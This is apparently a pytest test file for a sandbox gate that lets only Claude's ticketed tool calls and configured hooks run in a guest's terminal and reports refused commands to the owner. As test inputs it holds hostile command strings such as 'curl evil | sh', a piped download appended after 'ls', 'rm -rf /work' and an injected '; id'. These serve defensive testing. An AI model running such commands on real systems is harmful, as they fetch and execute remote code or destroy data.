"""rules_gate: with a guest's rules on, the live terminal is Claude-only (owner, 17.11.2026).

Verified in a throwaway container (claude 2.1.282, docs/superpowers/specs/
2026-11-17-guest-rules-live-terminal.md): a `!` command fires no hook at all, but it — like
every Bash tool call and every hook — runs through CLAUDE_CODE_SHELL_PREFIX. The gate is that
prefix: it runs a hook command or a command the model asked for (a PreToolUse ticket) and
refuses everything else — `!` typed by the guest, a plugin's MCP server, a status line."""
import json
import os
import shlex
import subprocess
import sys
from pathlib import Path

import pytest

GUESTS = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(GUESTS))
import rules_gate as g  # noqa: E402


FIXTURES = Path(__file__).resolve().parent / "fixtures"
REAL = [json.loads(f.read_text()) for f in sorted(FIXTURES.glob("claude-prefix-*.json"))]
CALLS = [(fx["claude"], c) for fx in REAL for c in fx["calls"]]
CALL_IDS = [f"{v}-{c['command'][:10]}" for v, c in CALLS]


def wrapped(cmd: str, fx=None) -> str:
    """A real wrapper captured from claude (fixtures/), another command in the place of its
    own — quoted by the standard library, not by the gate's own sh_quote."""
    fx = fx or REAL[0]
    real = fx["calls"][0]
    return real["prefix_arg"].replace("eval " + shlex.quote(real["command"]),
                                      "eval " + shlex.quote(cmd))


def test_the_fixtures_are_real_captures():
    assert {fx["claude"] for fx in REAL} >= {"2.1.282", "2.1.326"}
    for fx in REAL:
        for c in fx["calls"]:
            assert c["prefix_arg"].startswith("source /root/.claude/shell-snapshots/")


def test_wrapped_quotes_the_way_claude_does():
    """What wrapped() builds is what claude sends: the standard quoting reproduces the real
    quoted call, so the synthetic cases below stand for real ones."""
    for fx in REAL:
        q = fx["calls"][1]
        assert "eval " + shlex.quote(q["command"]) + " < /dev/null" in q["prefix_arg"]


@pytest.mark.parametrize("version,call", CALLS, ids=CALL_IDS)
def test_real_model_calls_pass_with_their_ticket(tmp_path, version, call):
    g.write_ticket(tmp_path, {"tool_name": "Bash", "tool_input": {"command": call["command"]}},
                   now=100)
    assert g.decide(call["prefix_arg"], set(), tmp_path, now=100)


@pytest.mark.parametrize("version,call", CALLS, ids=CALL_IDS)
def test_the_same_real_wrapper_without_a_ticket_is_refused(tmp_path, version, call):
    """A `!` command reaches the prefix in this same form, and has no ticket."""
    assert not g.decide(call["prefix_arg"], set(), tmp_path, now=100)


def test_the_real_hook_command_passes_as_a_hook(tmp_path):
    assert g.decide(REAL[0]["hook"], {g.TICKET_HOOK}, tmp_path, now=1)


# ── settings ───────────────────────────────────────────────────────────────────────────
def test_managed_settings_route_every_shell_through_the_gate_and_ticket_every_tool():
    s = g.managed_settings()
    assert s["env"]["CLAUDE_CODE_SHELL_PREFIX"] == "/etc/agentkennel/rules/shell-gate"
    assert s["env"]["EDITOR"] == s["env"]["VISUAL"] == "/etc/agentkennel/rules/no-editor"
    (entry,) = s["hooks"]["PreToolUse"]
    assert entry["matcher"] == "*"
    assert entry["hooks"] == [{"type": "command", "command": g.TICKET_HOOK}]


def test_managed_settings_close_plugins():
    s = g.managed_settings()
    assert s["strictKnownMarketplaces"] == []          # no marketplace can be added
    assert s["disableCommandPluginSources"] is True


def test_managed_settings_keep_the_agent_working():
    """The agent keeps running without permission prompts: nothing switches bypass off."""
    s = g.managed_settings()
    assert "disableBypassPermissionsMode" not in s
    assert "allowManagedHooksOnly" not in s     # the sandbox's own guard hooks keep running
    # the bypass warning defaults to "No, exit": a guest's Enter must not close the terminal
    assert s["skipDangerousModePermissionPrompt"] is True


def test_hook_commands_from_settings_files(tmp_path):
    user = tmp_path / "settings.json"
    user.write_text(json.dumps({
        "hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [
            {"type": "command", "command": "python3 /app/hooks/guard_kill.py"}]}],
            "Stop": [{"hooks": [{"type": "command", "command": "python3 /app/hooks/s.py"}]}]},
        "statusLine": {"type": "command", "command": "/app/status.sh"}}))
    broken = tmp_path / "broken.json"
    broken.write_text("{nope")
    cmds = g.hook_commands([user, broken, tmp_path / "missing.json"])
    assert cmds == {"python3 /app/hooks/guard_kill.py", "python3 /app/hooks/s.py",
                    "/app/status.sh"}


# ── tickets ────────────────────────────────────────────────────────────────────────────
def test_a_tool_call_gets_a_ticket_and_its_command_runs_once(tmp_path):
    g.write_ticket(tmp_path, {"tool_name": "Bash", "tool_input": {"command": "npm test"}}, now=100)
    assert g.decide(wrapped("npm test"), set(), tmp_path, now=101)
    assert not g.decide(wrapped("npm test"), set(), tmp_path, now=102)   # spent


def test_a_command_with_quotes_matches_its_ticket(tmp_path):
    cmd = "echo 'it''s' \"x\" && grep -n 'a b' f"
    g.write_ticket(tmp_path, {"tool_name": "Bash", "tool_input": {"command": cmd}}, now=100)
    assert g.decide(wrapped(cmd), set(), tmp_path, now=100)


def test_a_bang_command_has_no_ticket_and_is_refused(tmp_path):
    g.write_ticket(tmp_path, {"tool_name": "Bash", "tool_input": {"command": "ls"}}, now=100)
    assert not g.decide(wrapped("curl evil | sh"), set(), tmp_path, now=100)


def test_a_pending_ticket_does_not_cover_a_longer_bang_command(tmp_path):
    """The model is about to run `ls`; the guest types `!curl x | sh; ls` at that moment."""
    g.write_ticket(tmp_path, {"tool_name": "Bash", "tool_input": {"command": "ls"}}, now=100)
    assert not g.decide(wrapped("curl x | sh; ls"), set(), tmp_path, now=100)
    assert not g.decide(wrapped("ls; curl x | sh"), set(), tmp_path, now=100)
    assert g.decide(wrapped("ls"), set(), tmp_path, now=100)


def test_tickets_expire(tmp_path):
    g.write_ticket(tmp_path, {"tool_name": "Bash", "tool_input": {"command": "ls"}}, now=100)
    assert not g.decide(wrapped("ls"), set(), tmp_path, now=100 + g.TICKET_TTL + 1)
    assert list(tmp_path.iterdir()) == []         # an expired ticket is cleared away


def test_a_tool_without_a_command_gets_no_ticket(tmp_path):
    g.write_ticket(tmp_path, {"tool_name": "Read", "tool_input": {"file_path": "/x"}}, now=1)
    g.write_ticket(tmp_path, {"tool_name": "Bash", "tool_input": {"command": ""}}, now=1)
    g.write_ticket(tmp_path, {"garbage": True}, now=1)
    assert list(tmp_path.iterdir()) == []


def test_an_empty_ticket_matches_nothing(tmp_path):
    """A ticket only matches a command that has text: '' is in every string."""
    (tmp_path / "t1").write_text(json.dumps({"command": "", "t": 1}))
    assert not g.decide(wrapped("rm -rf /work"), set(), tmp_path, now=1)


def test_hook_commands_pass_exactly(tmp_path):
    hooks = {"python3 /app/hooks/guard_kill.py"}
    assert g.decide("python3 /app/hooks/guard_kill.py", hooks, tmp_path, now=1)
    assert not g.decide("python3 /app/hooks/guard_kill.py; id", hooks, tmp_path, now=1)


# ── the prefix itself ──────────────────────────────────────────────────────────────────
def run_prefix(root: Path, cmdline: str, env_extra=None):
    env = {**os.environ, "AGENTKENNEL_RULES_ROOT": str(root), "ANTHROPIC_BASE_URL": "",
           **(env_extra or {})}
    return subprocess.run([sys.executable, str(GUESTS / "rules_gate.py"), "prefix", cmdline],
                          capture_output=True, text=True, env=env, timeout=20)


def test_prefix_refuses_with_a_plain_reason(tmp_path):
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    marker = tmp_path / "ran"
    r = run_prefix(tmp_path, wrapped(f"touch {marker}"))
    assert r.returncode == g.REFUSED
    assert not marker.exists()
    assert "owner" in r.stderr and "Claude" in r.stderr


def test_prefix_runs_a_ticketed_command(tmp_path):
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    marker = tmp_path / "ran"
    cmd = f"touch {marker}"
    g.write_ticket(g.tickets_dir(tmp_path), {"tool_name": "Bash", "tool_input": {"command": cmd}})
    r = run_prefix(tmp_path, wrapped(cmd))
    assert r.returncode == 0, r.stderr
    assert marker.exists()


def test_prefix_lets_everything_through_with_the_rules_off(tmp_path):
    """Off: the flag is gone, but a claude started earlier still has the prefix in its
    environment — it must keep working, so the gate stays and passes all."""
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    g.install(tmp_path, False, source="# gate", run=lambda *a, **k: None)
    marker = tmp_path / "ran"
    r = run_prefix(tmp_path, f"touch {marker}")
    assert r.returncode == 0 and marker.exists()


def test_ticket_hook_never_blocks(tmp_path):
    env = {**os.environ, "AGENTKENNEL_RULES_ROOT": str(tmp_path)}
    for stdin in ("not json", json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls"}})):
        r = subprocess.run([sys.executable, str(GUESTS / "rules_gate.py"), "ticket"],
                           input=stdin, capture_output=True, text=True, env=env, timeout=20)
        assert r.returncode == 0 and r.stdout == ""


# ── install on / off ───────────────────────────────────────────────────────────────────
def test_install_on_writes_the_lock(tmp_path):
    calls = []
    g.install(tmp_path, True, source="#!/usr/bin/env python3\n# gate\n",
              run=lambda argv, **k: calls.append(argv))
    rules = tmp_path / "etc/agentkennel/rules"
    assert (rules / "on").exists()
    assert (rules / "gate.py").read_text().endswith("# gate\n")
    for name in ("shell-gate", "no-editor", "gate.py"):
        assert os.access(rules / name, os.X_OK)
    managed = json.loads((tmp_path / "etc/claude-code/managed-settings.json").read_text())
    assert managed == g.managed_settings()
    assert (rules / "tmux.conf").read_text() == g.TMUX_LOCK
    # the shell gate is a bare path (claude runs `<prefix> '<command>'`) that hands over to python
    gate_sh = (rules / "shell-gate").read_text()
    assert "/etc/agentkennel/rules/gate.py" in gate_sh and 'prefix "$1"' in gate_sh


def test_install_on_locks_running_tmux_and_closes_the_command_line(tmp_path):
    sock_dir = tmp_path / "tmp/tmux-0"
    sock_dir.mkdir(parents=True)
    (sock_dir / "default").write_text("")
    calls = []
    g.install(tmp_path, True, source="# gate", run=lambda argv, **k: calls.append(argv))
    sock = str(sock_dir / "default")
    assert ["tmux", "-S", sock, "source-file", str(tmp_path / "etc/agentkennel/rules/tmux.conf")] in calls
    assert ["tmux", "-S", sock, "kill-session", "-t", "=cmd-shell"] in calls


def tmux(sock, *argv, env=None):
    return subprocess.run(["tmux", "-L", sock, *argv], capture_output=True, text=True,
                          timeout=10, env=env)


@pytest.fixture
def tmux_server(tmp_path):
    sock = f"rules-gate-test-{os.getpid()}-{tmp_path.name[-10:]}"
    (tmp_path / "home").mkdir()
    r = subprocess.run(["tmux", "-L", sock, "-f", "/dev/null", "new-session", "-d", "-s", "t",
                        "cat"], capture_output=True, text=True, timeout=10)
    assert r.returncode == 0, r.stderr
    yield sock
    tmux(sock, "kill-server")


def prefix_of(sock):
    return tmux(sock, "show", "-gv", "prefix").stdout.strip()


def socket_path(sock):
    return tmux(sock, "display", "-p", "#{socket_path}").stdout.strip()


def test_tmux_lock_takes_away_the_prefix_key_in_a_real_tmux(tmp_path, tmux_server):
    lock = tmp_path / "lock.conf"
    lock.write_text(g.TMUX_LOCK)
    assert tmux(tmux_server, "source-file", str(lock)).returncode == 0
    assert prefix_of(tmux_server) == "None"
    assert tmux(tmux_server, "show", "-gv", "prefix2").stdout.strip() == "None"


def test_lifting_the_lock_in_a_real_tmux_keeps_the_guests_own_prefix(tmp_path, tmux_server):
    """Off: tmux's default, then the guest's own ~/.tmux.conf on top (never C-b over it)."""
    lock, home = tmp_path / "lock.conf", tmp_path / "home"
    lock.write_text(g.TMUX_LOCK)
    tmux(tmux_server, "source-file", str(lock))
    for argv in g.tmux_unlock_argv(socket_path(tmux_server), home=home):
        assert subprocess.run(argv, capture_output=True, timeout=10).returncode == 0
    assert prefix_of(tmux_server) == "C-b"
    (home / ".tmux.conf").write_text("set -g prefix C-a\n")
    tmux(tmux_server, "source-file", str(lock))
    for argv in g.tmux_unlock_argv(socket_path(tmux_server), home=home):
        subprocess.run(argv, capture_output=True, timeout=10)
    assert prefix_of(tmux_server) == "C-a"


def test_the_core_tmux_conf_reads_the_lock_only_while_the_rules_are_on(tmp_path):
    """New tmux servers started with the repo's tmux.conf (its lock paths moved into tmp)."""
    rules = tmp_path / "rules"
    rules.mkdir()
    conf = tmp_path / "tmux.conf"
    conf.write_text((GUESTS.parent / "tmux.conf").read_text()
                    .replace("/etc/agentkennel/rules", str(rules)))
    (rules / "tmux.conf").write_text(g.TMUX_LOCK)       # left behind alone: must not count
    env = {**os.environ, "HOME": str(tmp_path)}
    for on, want in ((False, "C-b"), (True, "None")):
        if on:
            (rules / "on").write_text("on\n")
        sock = f"rules-core-{os.getpid()}-{int(on)}"
        tmux(sock, "-f", str(conf), "new-session", "-d", "-s", "t", "cat", env=env)
        try:
            assert prefix_of(sock) == want, on
        finally:
            tmux(sock, "kill-server")


def test_install_off_lifts_every_part_of_the_lock(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "root"))
    calls = []
    sock_dir = tmp_path / "tmp/tmux-0"
    sock_dir.mkdir(parents=True)
    (sock_dir / "default").write_text("")
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    g.install(tmp_path, False, source="# gate", run=lambda argv, **k: calls.append(argv))
    rules = tmp_path / "etc/agentkennel/rules"
    for gone in (rules / "on", rules / "tmux.conf",
                 tmp_path / "etc/claude-code/managed-settings.json"):
        assert not gone.exists(), gone
    # kept: a claude started while on still calls these, and with the flag gone they pass all
    for kept in ("gate.py", "shell-gate", "no-editor"):
        assert os.access(rules / kept, os.X_OK), kept
    assert (tmp_path / "etc/claude-code").is_dir()     # the next lock applies mid-session
    assert calls == g.tmux_unlock_argv(str(sock_dir / "default"), home=tmp_path / "root")


def test_install_off_leaves_a_managed_settings_file_that_is_not_ours(tmp_path):
    managed = tmp_path / "etc/claude-code/managed-settings.json"
    managed.parent.mkdir(parents=True)
    managed.write_text('{"model": "opus"}')
    g.install(tmp_path, False, source="# gate", run=lambda *a, **k: None)
    assert managed.read_text() == '{"model": "opus"}'


def test_install_on_refuses_to_overwrite_a_managed_settings_file_that_is_not_ours(tmp_path):
    managed = tmp_path / "etc/claude-code/managed-settings.json"
    managed.parent.mkdir(parents=True)
    managed.write_text('{"model": "opus"}')
    with pytest.raises(SystemExit):
        g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)


def test_is_on(tmp_path):
    assert not g.is_on(tmp_path)
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    assert g.is_on(tmp_path)


def test_install_off_on_a_sandbox_never_locked_writes_nothing(tmp_path):
    calls = []
    g.install(tmp_path, False, source="# gate", run=lambda argv, **k: calls.append(argv))
    assert not (tmp_path / "etc").exists() and calls == []


# ── review fixes (17.11.2026) ──────────────────────────────────────────────────────────
def test_managed_settings_stop_claude_updating_itself():
    """sbx-yan's claude went from the image's 2.1.282 to 2.1.326 by itself within 20 minutes."""
    assert g.managed_settings()["env"]["DISABLE_AUTOUPDATER"] == "1"


def run_sh(script_text, tmp_path, env_extra, *args):
    script = tmp_path / "script.sh"
    script.write_text(script_text)
    script.chmod(0o755)
    return subprocess.run(["/bin/sh", str(script), *args], capture_output=True, text=True,
                          timeout=20, env={**os.environ, **env_extra})


def test_no_editor_refuses_while_on_and_hands_over_while_off(tmp_path):
    bin_ = tmp_path / "bin"
    bin_.mkdir()
    marker = tmp_path / "edited"
    (bin_ / "editor").write_text(f'#!/bin/sh\necho "$1" > {marker}\n')
    (bin_ / "editor").chmod(0o755)
    env = {"AGENTKENNEL_RULES_ROOT": str(tmp_path), "PATH": f"{bin_}:/usr/bin:/bin",
           "ANTHROPIC_BASE_URL": ""}
    r = run_sh(g.NO_EDITOR_SH, tmp_path, env, "/tmp/file.txt")
    assert r.returncode == 0 and marker.read_text().strip() == "/tmp/file.txt"    # off
    marker.unlink()
    (tmp_path / "etc/agentkennel/rules").mkdir(parents=True)
    (tmp_path / "etc/agentkennel/rules/on").write_text("on\n")
    r = run_sh(g.NO_EDITOR_SH, tmp_path, env, "/tmp/file.txt")
    assert r.returncode == 1 and not marker.exists() and "Claude" in r.stderr


def test_a_missing_gate_refuses_with_a_clear_reason_never_exit_2(tmp_path):
    """Exit 2 from a PreToolUse hook (hooks run through the prefix) would block every tool."""
    r = run_sh(g.SHELL_GATE_SH, tmp_path, {"AGENTKENNEL_RULES_ROOT": str(tmp_path)}, "true")
    assert r.returncode == g.REFUSED
    assert "gate" in r.stderr and "owner" in r.stderr


def test_a_gate_that_crashes_refuses_with_a_clear_reason(tmp_path, monkeypatch, capsys):
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    monkeypatch.setenv("AGENTKENNEL_RULES_ROOT", str(tmp_path))
    monkeypatch.setattr(g, "decide", lambda *a, **k: 1 / 0)
    assert g.main(["prefix", "echo hi"]) == g.REFUSED
    err = capsys.readouterr().err
    assert "rules gate failed" in err and "owner" in err


def test_the_gate_works_in_a_folder_that_was_deleted(tmp_path):
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    gone = tmp_path / "gone"
    gone.mkdir()
    r = subprocess.run(["bash", "-c", f'cd "{gone}" && rmdir "{gone}" && exec "$0" "$@"',
                        sys.executable, str(GUESTS / "rules_gate.py"), "prefix", "echo hi"],
                       capture_output=True, text=True, timeout=20,
                       env={**os.environ, "AGENTKENNEL_RULES_ROOT": str(tmp_path),
                            "ANTHROPIC_BASE_URL": ""})
    assert r.returncode == g.REFUSED and "Traceback" not in r.stderr


def test_project_hooks_count_from_the_project_and_every_folder_above(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", "/work/site")
    files = [str(p) for p in g.settings_files(tmp_path, "/work/site/src/app")]
    for d in ("/work/site/src/app", "/work/site/src", "/work/site", "/work"):
        assert f"{d}/.claude/settings.json" in files and f"{d}/.claude/settings.local.json" in files
    assert str(tmp_path / "home/.claude/settings.json") in files
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", "/elsewhere")
    assert "/elsewhere/.claude/settings.json" in [str(p) for p in g.settings_files(tmp_path, "/work")]


def test_the_refusal_log_stays_small(tmp_path):
    log = tmp_path / "refused.log"
    log.write_text("x" * (g.REFUSED_LOG_MAX + 5000))
    g.log_refusal(log, "curl evil | sh")
    assert log.stat().st_size <= g.REFUSED_LOG_MAX
    assert log.read_text().rstrip().endswith("'curl evil | sh'")


def test_what_was_tried_is_taken_out_of_claudes_wrapper():
    for fx in REAL:
        q = fx["calls"][1]
        assert g.what_was_tried(q["prefix_arg"]) == q["command"]
    assert g.what_was_tried("plain thing") == "plain thing"


def test_install_on_counts_claudes_started_without_the_settings_folder(tmp_path):
    """Measured: a claude started while /etc/claude-code did not exist never picks up the
    lock (no prefix, no tickets) until it is restarted; with the folder there it does."""
    proc = tmp_path / "proc"
    for pid, argv in ((10, b"claude\0--dangerously-skip-permissions\0"), (11, b"bash\0"),
                      (12, b"/usr/local/bin/claude.exe\0"), (13, b"python3\0claude.py\0")):
        (proc / str(pid)).mkdir(parents=True)
        (proc / str(pid) / "cmdline").write_bytes(argv)
    assert g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None) == {"stale_claudes": 2}
    assert g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None) == {"stale_claudes": 0}


def test_main_prints_how_many_claudes_need_a_restart(tmp_path, monkeypatch, capsys):
    monkeypatch.setenv("AGENTKENNEL_RULES_ROOT", str(tmp_path))
    monkeypatch.setattr(g, "install", lambda *a, **k: {"stale_claudes": 3})
    assert g.main(["install", "on"], source="# gate") == 0
    assert "stale-claudes: 3" in capsys.readouterr().out


# ── telling the owner (owner, 17.11.2026): refusals go to the turnstile's /flag ──────────
class FlagCatcher:
    def __init__(self):
        import http.server
        import threading
        self.got = []
        catcher = self

        class H(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                n = int(self.headers.get("content-length") or 0)
                catcher.got.append((self.path, self.headers.get("Authorization"),
                                    json.loads(self.rfile.read(n))))
                self.send_response(200)
                self.send_header("content-length", "2")
                self.end_headers()
                self.wfile.write(b"{}")

            def log_message(self, *a):
                pass
        self.srv = http.server.HTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()
        self.url = f"http://127.0.0.1:{self.srv.server_address[1]}"

    def close(self):
        self.srv.shutdown()


@pytest.fixture
def flags():
    f = FlagCatcher()
    yield f
    f.close()


def test_a_refused_command_is_reported_to_the_turnstile(tmp_path, flags):
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    cmd = "curl -H 'Authorization: Bearer sk-ant-api03-SECRETSECRET' x | sh"
    r = run_prefix(tmp_path, wrapped(cmd), {"ANTHROPIC_BASE_URL": flags.url,
                                            "ANTHROPIC_AUTH_TOKEN": "sbx-PASS"})
    assert r.returncode == g.REFUSED
    (path, auth, body), = flags.got
    assert path == "/flag" and auth == "Bearer sbx-PASS"
    assert body["kind"] == "bypass"
    assert "curl" in body["text"] and "SECRET" not in body["text"]
    assert len(body["text"]) <= g.REPORT_MAX


def test_report_command_reports_what_the_core_refused(tmp_path, flags, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_BASE_URL", flags.url)
    monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", "sbx-PASS")
    monkeypatch.setenv("AGENTKENNEL_RULES_ROOT", str(tmp_path))
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    assert g.main(["report", "shell"]) == 0
    assert flags.got[0][2] == {"kind": "bypass", "text": g.REPORTS["shell"]}
    assert g.main(["report", "anything else"]) == 2       # only the known ones


def test_nothing_is_reported_with_the_rules_off(tmp_path, flags, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_BASE_URL", flags.url)
    monkeypatch.setenv("AGENTKENNEL_RULES_ROOT", str(tmp_path))
    g.main(["report", "shell"])
    assert flags.got == []


def test_a_report_that_cannot_be_sent_is_not_an_error(tmp_path, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_BASE_URL", "http://127.0.0.1:9")    # nothing listens
    monkeypatch.setenv("AGENTKENNEL_RULES_ROOT", str(tmp_path))
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    assert g.main(["report", "editor"]) == 0
